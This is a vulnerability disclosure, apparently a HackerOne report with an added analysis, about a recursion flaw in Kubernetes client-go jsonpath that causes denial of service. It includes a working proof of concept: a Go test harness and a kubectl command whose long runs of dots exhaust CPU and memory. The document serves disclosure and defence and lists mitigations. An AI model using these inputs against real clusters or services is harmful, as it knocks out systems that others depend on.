# Denial of Service in client-go jsonpath recursive descent function

## Metadata
- **Source:** HackerOne
- **Report:** 882923 | https://hackerone.com/reports/882923
- **Submitted:** 2020-05-26
- **Reporter:** lazydog
- **Program:** Kubernetes/client-go
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Denial of Service, Algorithmic Complexity, Resource Exhaustion
- **CVEs:** None
- **Category:** memory-binary

## Summary
The evalRecursive() function in client-go's jsonpath parser lacks proper recursion depth limits, allowing specially crafted JSONPath expressions with deeply nested recursive descent operators to cause excessive CPU and memory consumption. This affects kubectl and any application using client-go's jsonpath utilities when processing user-controlled JSONPath expressions.

## Attack scenario
1. Attacker identifies that target system processes JSONPath queries from user input (e.g., kubectl get resources with -o=jsonpath flag)
2. Attacker crafts malicious JSONPath template containing many consecutive recursive descent operators (dots/periods)
3. Attacker submits the malicious JSONPath expression to the vulnerable application
4. The evalRecursive() function enters unbounded recursion with exponential branching
5. System CPU and memory usage spike dramatically, consuming all available resources
6. Legitimate operations timeout or fail, causing denial of service

## Root cause
The evalRecursive() function in client-go/util/jsonpath/jsonpath.go (line 451+) does not implement recursion depth limits or memoization, allowing recursive descent operators to trigger exponential algorithmic complexity. Each nested recursive descent multiplies the evaluation branches without bounds.

## Attacker mindset
An attacker targeting Kubernetes clusters or applications using client-go would recognize that JSONPath is often exposed via kubectl commands or API endpoints. By crafting a template with deeply nested dots (recursive descent), they can trigger exponential computation, achieving denial of service with minimal payload size.

## Defensive takeaways
- Implement maximum recursion depth limits in jsonpath evaluation functions
- Add timeout mechanisms for jsonpath execution
- Cache/memoize recursive descent evaluation results
- Validate JSONPath template complexity before execution
- Sanitize or restrict user-supplied JSONPath expressions
- Monitor CPU/memory consumption during jsonpath operations and implement circuit breakers
- Consider pre-compiling JSONPath templates with complexity analysis

## Variant hunting
Search for other recursive descent operations in JSON/YAML query languages (JQ, YQ). Test other template engines in Kubernetes for similar unbounded recursion issues. Check for similar patterns in apiextensions-apiserver and cli-runtime components that depend on client-go.

## MITRE ATT&CK
- T1190
- T1498
- T1499

## Notes
The vulnerability was discovered through fuzzing with go-fuzz. The PoC demonstrates that simple recursive descent patterns (many consecutive dots) cause the crash. Real-world impact verified through kubectl get services command. The issue affects multiple Kubernetes components that depend on client-go (kubectl, apiextensions-apiserver, cli-runtime). User-controlled JSONPath parameters are common in cloud infrastructure tools, making this a practical attack vector.

## Full report
<details><summary>Expand</summary>

## Summary:
jsonpath recursive descent  cause a DoS vul
`kubectl` `apiextensions-apiserver` `cli-runtime` and `kubernetes` is depends on `client-go`

I think `evalRecursive()` cause of this vulnerability
function pos: client-go/util/jsonpath/jsonpath.go:451

## Component Version:

client-go:master

## Steps To Reproduce:
i written a simple fuzz based on  go-fuzz, im so lucky to found a crasher.

  1. pull the latest kubernetes code 

```
git clone https://github.com/kubernetes/kubernetes
```

  2.change workdir to  `kubernetes/staging/src/k8s.io/client-go/util/jsonpath`
3.copy this poc to disk use `vim` or `cat`, change filename to `crash_tests.go`

```
package jsonpath

import (
	"testing"
 	"bytes"
 	"encoding/json"
)

type jsonpathcrashTest struct {
 name     string
 template string
 input    interface{}
}

func FuzzParse(test *jsonpathcrashTest, allowMissingKeys bool) error {

 j := New(test.name)

 j.AllowMissingKeys(allowMissingKeys)
 err := j.Parse(test.template)
 if err != nil {
  return err
 }

 buf := new(bytes.Buffer)
 err = j.Execute(buf, test.input)
 if err != nil {
  return err
 }

 return err
}

func Fuzz(data []byte) int {
 var input = []byte(`{
  "kind": "List",
  "items":[
    {
   "kind":"None",
   "metadata":{
     "name":"127.0.0.1",
     "labels":{
    "kubernetes.io/hostname":"127.0.0.1"
     }
   },
   "status":{
     "capacity":{"cpu":"4"},
     "ready": true,
     "addresses":[{"type": "LegacyHostIP", "address":"127.0.0.1"}]
   }
    },
    {
   "kind":"None",
   "metadata":{
     "name":"127.0.0.2",
     "labels":{
    "kubernetes.io/hostname":"127.0.0.2"
     }
   },
   "status":{
     "capacity":{"cpu":"8"},
     "ready": false,
     "addresses":[
    {"type": "LegacyHostIP", "address":"127.0.0.2"},
    {"type": "another", "address":"127.0.0.3"}
     ]
   }
    }
  ],
  "users":[
    {
   "name": "myself",
   "user": {}
    },
    {
   "name": "e2e",
   "user": {"username": "admin", "password": "secret"}
   }
  ]
   }`)

 var nodesData interface{}
 err := json.Unmarshal(input, &nodesData)
 if err != nil {
  print(err)
 }

 fuzzData := string(data)

 test := jsonpathcrashTest{name: "crash", template: fuzzData, input: nodesData}

 err = FuzzParse(&test, false)
 if err != nil {
  return 0
 }

 err = FuzzParse(&test, true)
 if err != nil {
  return 0
 }

 return 1
}


func TestCrash(t *testing.T) {
	var data = []byte("{..................." +
	"...................." +
	"...................." +
	"...................." +
	"...................." +
	"...................." +
	"...................." +
	"...................." +
	"...................." +
	"..........51}.")
	Fuzz(data)
}

```



4.run `go test` command, now we can see the test process use a lot of cpu and memeory


{F843537}

5.i found a real case in `kubectl`, if resource (like services pods node) has any record can cause DoS.

```
kubectl get services -o=jsonpath="{.....................................................................................................................................}"
```

{F843557}

## Impact

maybe in some scenes, attacker can cause DoS.

eg. cloud components use `client-go` util to process cluster resouce json record.

any other program exec  `kubectl`  with jsonpath options, and jsonpath params by user control.

</details>

---
*Analysed by Claude on 2026-05-24*
